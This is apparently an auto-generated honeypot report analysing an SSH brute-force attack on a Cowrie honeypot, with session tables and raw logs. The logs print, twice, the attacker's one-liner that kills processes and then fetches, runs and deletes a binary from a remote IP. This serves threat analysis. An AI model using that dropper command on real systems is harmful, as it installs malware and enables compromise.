
# SSH Brute Force and Multi-Stage Payload Execution: Analyzing a Sophisticated Attack on a Linux Honeypot System

<details>
<summary>
<h2>Quick Stats</h2>
</summary>


- This attack was carried out by a `1` unique source IP address(es): `204.76.203.13`
- A total of `5` sessions were logged. `1` sessions were successful logins.
- `5` login attempts were made. `1` were successful.
- `5` unique username/password pairs were attempted. `1` were successful.
- `1` unique destination ports were targeted: `2222`
- `5` unique source ports were used: `56388`, `56398`, `56402`, `54312`, `54330`
- `9` commands were input in total. `1` IP(s) and `1` URL(s) were found in the commands
- `2` unique malware samples were downloaded. `1` IP(s) and `1` URL(s) were found in the malware samples
- This attacks was recorded in `3` log types: `cowrie.log`, `cowrie.json`, `dshield.log`
- A total of `260` log events were logged in `3` log files: `cowrie.2023-11-30.json`, `cowrie.2023-11-30.log`, `dshield.log`

</details>

---

The attack on the Linux honeypot system involved a series of actions aimed at gaining unauthorized access, establishing a foothold, and executing arbitrary code. The primary methods used in the attack included the exploitation of SSH services with brute force attempts, the use of scripted commands for downloading and executing architecture-specific binaries, and the manipulation of system processes and file permissions to maintain access and evade detection.

### Attack Details:
- **Source IP:** `204.76.203.13`
- **Target System:** Linux-based honeypot
- **Attack Vector(s):** SSH Brute Force, Command Execution, File Manipulation

### Key Attack Methods:
1. **Brute Force Login Attempts:** Potential use of common credentials to gain initial access via SSH.
2. **Remote Command Execution:** Use of standard shell commands to interact with the system and verify control.
3. **Downloading Malicious Payloads:** Attempted retrieval of malware from a remote server using multiple transfer methods (`wget`, `curl`, `tftp`).
4. **Binary Execution:** Changing permissions of downloaded files to execute them with `chmod 777`.
5. **Process Disruption:** Commands aimed at identifying and terminating specific processes, likely to prevent detection or disrupt security measures.
6. **Evasion Techniques:** Removal of traces by deleting the downloaded malware executables after running them.

### Goals of the Attack:
- **Unauthorized Access:** To gain control over the honeypot system by bypassing authentication mechanisms.
- **System Compromise:** To establish a foothold within the system for persistent access and potential lateral movement within the network.
- **Malicious Execution:** To execute malware designed to perform various malicious activities tailored to the compromised system's architecture.
- **Defense Evasion:** To operate undetected by circumventing security measures and erasing evidence of malicious activity.
- **C2 Communication:** To establish a channel back to the attacker's infrastructure for ongoing control and coordination of the attack.

Overall, the attack demonstrates sophistication with the intent to compromise systems, execute payloads, potentially move laterally in the network, and possibly exfiltrate sensitive data or cause disruption. The use of a Linux honeypot was instrumental in revealing the attacker's techniques and objectives, contributing valuable information for securing real systems against such threats.

<details>
<summary>
<h3>Extended Summary</h3>
</summary>


- This attack was carried out by a `1` unique **source IP** address(es):
	- `SourceIP 204.76.203.13 with 5 sessions, 1 dst_ports 2 successful logins, 18 commands, 0 uploads, 8 downloads`

- `5` unique **source ports** were used:
	- `Src Port: 56388 Used 1 times`
	- `Src Port: 56398 Used 1 times`
	- `Src Port: 56402 Used 1 times`
	- `Src Port: 54312 Used 1 times`
	- `Src Port: 54330 Used 1 times`

- `1` unique **destination ports** were targeted:
	- `Dst Port: `2222` Used `5` times`

- A total of `5` sessions were logged:
	- `Session 7da06240e8e7 SSH 204.76.203.13:56388 -> 172.31.5.68:2222 Duration: 1.60s`
	- `Session 355bb09fda53 SSH 204.76.203.13:56398 -> 172.31.5.68:2222 Duration: 3.76s`
	- `Session 4410f6013e99 SSH 204.76.203.13:56402 -> 172.31.5.68:2222 Duration: 5.72s`
	- `Session 437a71e27810 SSH 204.76.203.13:54312 -> 172.31.5.68:2222 Duration: 1.58s`
	- `Session 651b145b8fb8 SSH 204.76.203.13:54330 -> 172.31.5.68:2222 Login: root:root Commands: 9, Malware: 4, Duration: 51.12s`

- `1` were **successful logins**, 
- `4` were **failed logins**, 
- `1` had commands, 
- `1` had malware.
- `5` unique username/password pairs were attempted. `1` were successful.
- `9` commands were input in total. `1` IP(s) and `1` URL(s) were found in the commands
- `2` unique malware samples were downloaded. 
- `1` IP(s) and `1` URL(s) were found in the malware samples
- This attacks was recorded in `3` log types: 
	- `cowrie.log`
	- `cowrie.json`
	- `dshield.log`

- A total of `260` log events were logged in `3` log files: 
	- `cowrie.2023-11-30.json`
	- `cowrie.2023-11-30.log`
	- `dshield.log`


</details>

---


<details>
<summary>
<h1>Custom Scripts Used To Generate This Report</h1>
</summary>


#### [main.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/main.py)
> Main script for running all analyzers through AttackAnalyzer inteface. (IN PROGRESS)

#### [runtests.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/runtests.py)
> Script for running tests from the tests directory

#### [analyzerbase](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/analyzerbase)
> Base classes, utility functions, libraries, and constants for all analyzer modules

| Script | Description |
| --- | --- |
| [attack.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/analyzerbase/attack.py) | Attack object for storing all data related to a single attack. Constructed by the loganalyzer scripts then processed by openaianlyzers and ipanalyzers before being passed to markdownwriters |
| [common.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/analyzerbase/common.py) | Imports and constants used by all analyzer modules |
| [malware.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/analyzerbase/malware.py) | Malware object for storing, standardizing and reading a malware sample. Constructed by its parent Session object and accessed by its Attack object |
| [session.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/analyzerbase/session.py) | Session object for storing all data related to a single session. Constructed by its parent SourceIP object and accessed by its parent Attack object |
| [sourceip.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/analyzerbase/sourceip.py) | SourceIP object for storing all data related to a single source IP. Constructed by the loganalyzer scripts and accessed by its Attack object |
| [util.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/analyzerbase/util.py) | Utility functions for all analyzer modules including functions for extracting IPs and URLs from text, standardizing malware, and hashing text |

#### [loganalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/loganalyzers)
> Scripts for analyzing logs to create Attack objects, organizing and read Attack files

| Script | Description |
| --- | --- |
| [logparser.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/loganalyzers/logparser.py) | Classes for reading all logs as json objects with standardized keys |
| [cowrieloganalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/loganalyzers/cowrieloganalyzer.py) | Reads Cowrie logs to create and merge Attack objects |
| [webloganalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/loganalyzers/webloganalyzer.py) | Reads Web logs to create and merge Attack objects (IN PROGRESS) |
| [attackdirorganizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/loganalyzers/attackdirorganizer.py) | Organizes Attack files into directories by source IP and attack ID for easy reading and quicker loading |
| [attackdirreader.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/loganalyzers/attackdirreader.py) | Reads Attack files from directories organized by attackdirorganizer |

#### [openaianalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/openaianalyzers)
> Scripts for analyzing Attack objects using OpenAI's Completion and Assistant APIs

| Script | Description |
| --- | --- |
| [aibase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/openaianalyzers/aibase.py) | Base class used by all OpenAI analyzers that handles catching API errors, formating content for the API, and counting tokens to calculate cost |
| [completions.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/openaianalyzers/completions.py) | OpenAICompletionsAnalyzer uses the the Completions API with few-shot-prompting to explain commands and comment malware source code |
| [assistant.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/openaianalyzers/assistant.py) | OpenAIAssistantAnalyzer uses the Assistant API with function-calling to query an Attack object to answer questions about the attack |
| [tools.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/openaianalyzers/tools.py) | Function schemas used by the OpenAIAssistantAnalyzer to structure how the model can iterogate the Attack object and its Session and Malware subobjects |

#### [osintanalyzers](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/osintanalyzers)
> Scripts for collecting OSINT data for IPs, URLS and Malware found in the Attack object

| Script | Description |
| --- | --- |
| [osintbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/osintanalyzers/osintbase.py) | Base class for all OSINT analyzers that uses requests and SoupScraper to collect data handles catching API errors, reading/writing stored data, and reducing data for before passing to OpenAIAnalyzer |
| [ipanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/osintanalyzers/ipanalyzer.py) | IPAnalyzer handles collecting data on IPs from ISC, Shodan, Threatfox, Cybergordon, Whois |
| [mwanalyzer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/osintanalyzers/mwanalyzer.py) | MalwareAnalyzer handles collecting data on malware and IOCs from MalwareBazaar, ThreatFox, URLhaus, and Malpedia,  |
| [soupscraper.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/osintanalyzers/soupscraper.py) | SoupScraper an all in one class for simple scraping with BeautifulSoup + Selenium I borrowed from my previous projects |
| [getchromedrier.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/osintanalyzers/getchromedrier.py) | Utility script to download correct chromedriver for Selenium |

#### [markdownwriters](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/markdownwriters)
> Scripts for writing markdown files from Attack objects

| Script | Description |
| --- | --- |
| [markdownwriterbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/markdownwriters/markdownwriterbase.py) | Base class for all markdown writers and markdown shortcut functions |
| [cowrieattackmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/markdownwriters/cowrieattackmarkdownwriter.py) | Markdown writer for Cowrie Attack objects (TODO abstract this to be AttackMarkdownWriter so it can be used for all future Attack objects types, Cowrie, Web, etc.) |
| [ipmarkdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/markdownwriters/ipmarkdownwriter.py) | Markdown writer for ipdata added to Attack objects by IPAnalyzer |
| [visualizer.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/markdownwriters/visualizer.py) | Graphing functions for visualizing data from Counter objects from Attack().counts and osint_data['counts'] |

#### [tests](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/tests)
> Tests for all analyzer modules

| Script | Description |
| --- | --- |
| [test_analyzerbase.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/tests/test_analyzerbase.py) | Tests for analyzerbase |
| [test_loganalyzers.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/tests/test_loganalyzers.py) | Tests for loganalyzers |
| [test_openaianalyzers.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/tests/test_openaianalyzers.py) | Tests for openaianalyzers |
| [test_osintanalyzers.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/tests/test_osintanalyzers.py) | Tests for osintanalyzers |
| [test_markdownwriter.py](https://github.com/LucasFaudman/honeypot-ai/blob/main/analyzer-scripts/tests/test_markdownwriter.py) | Tests for markdownwriter |

</details>

---


<details>
<summary>
<h1>Time and Date of Activity</h1>
</summary>

First activity logged: `2023-11-30 01:41:53.570525`
* First session: `7da06240e8e7`
* `Session 7da06240e8e7 SSH 204.76.203.13:56388 -> 172.31.5.68:2222 Duration: 1.60s`

Last activity logged: `2023-11-30 01:42:57.643806`
* Last session: `651b145b8fb8`
* `Session 651b145b8fb8 SSH 204.76.203.13:54330 -> 172.31.5.68:2222 Login: root:root Commands: 9, Malware: 4, Duration: 51.12s`


| Session ID | IP | Src Port | Dst Port | Start Time | End Time | Duration |
| --- | --- | --- | --- | --- | --- | --- |
| `7da06240e8e7` | `204.76.203.13` | `56388` | `2222` | `2023-11-30 01:41:53.570525` | `2023-11-30 01:41:55.166817` | `1.5956263542175293` |
| `651b145b8fb8` | `204.76.203.13` | `54330` | `2222` | `2023-11-30 01:42:06.527180` | `2023-11-30 01:42:57.643806` | `51.115936279296875` |

<details>
<summary>
<h3>All Sessions</h3>
</summary>


| Session ID | IP | Src Port | Dst Port | Start Time | End Time | Duration |
| --- | --- | --- | --- | --- | --- | --- |
| `7da06240e8e7` | `204.76.203.13` | `56388` | `2222` | `2023-11-30 01:41:53.570525` | `2023-11-30 01:41:55.166817` | `1.5956263542175293` |
| `355bb09fda53` | `204.76.203.13` | `56398` | `2222` | `2023-11-30 01:41:55.241425` | `2023-11-30 01:41:58.999284` | `3.7572450637817383` |
| `4410f6013e99` | `204.76.203.13` | `56402` | `2222` | `2023-11-30 01:41:59.074441` | `2023-11-30 01:42:04.793713` | `5.718630790710449` |
| `437a71e27810` | `204.76.203.13` | `54312` | `2222` | `2023-11-30 01:42:04.867954` | `2023-11-30 01:42:06.453447` | `1.5848052501678467` |
| `651b145b8fb8` | `204.76.203.13` | `54330` | `2222` | `2023-11-30 01:42:06.527180` | `2023-11-30 01:42:57.643806` | `51.115936279296875` |

</details>

---


</details>

---


<details>
<summary>
<h1>Relevant Logs, File or Email</h1>
</summary>


## Log Stats

| Log Name | Lines |
| --- | --- |
| cowrie.log | 146 |
| cowrie.json | 94 |
| dshield.log | 20 |

## Cowrie .log Logs
Total Cowrie logs: `146`

#### First Session With Commands 651b145b8fb8 Cowrie .log Logs
This sample shows the Cowrie `.log` Logs for session_id `651b145b8fb8` the first session in this attack where the attacker exectuted commands in on the honeypot system.Here is the full log:

<details>
<summary>
<h3>Cowrie .log Logs for 651b145b8fb8</h3>
</summary>


```verilog
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
